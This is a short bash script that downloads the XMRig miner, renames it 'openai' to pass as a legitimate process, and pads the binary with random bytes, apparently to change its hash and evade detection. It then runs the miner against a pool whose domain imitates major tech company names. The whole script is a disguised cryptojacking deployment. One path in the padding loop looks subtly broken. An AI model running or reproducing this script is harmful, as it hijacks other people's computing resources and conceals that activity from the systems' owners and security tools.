#!/bin/bash

U=$1
wget -O 1.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz 
tar -zxvf 1.tar.gz
mv xmrig-6.21.0 openai
mv openai/xmrig openai/openai
random_number=$RANDOM
rm -rf 1.tar.gz
cd openai && rm -rf SHA256SUMS
for i in $(seq 1 $random_number); do
  echo -n "0" >> openai/openai
done
./openai -a rx -o stratum+ssl://rx.microsoftazureamazonawsibmapplenvidiaoracleciscoadobe.com:443 -u $U -p x
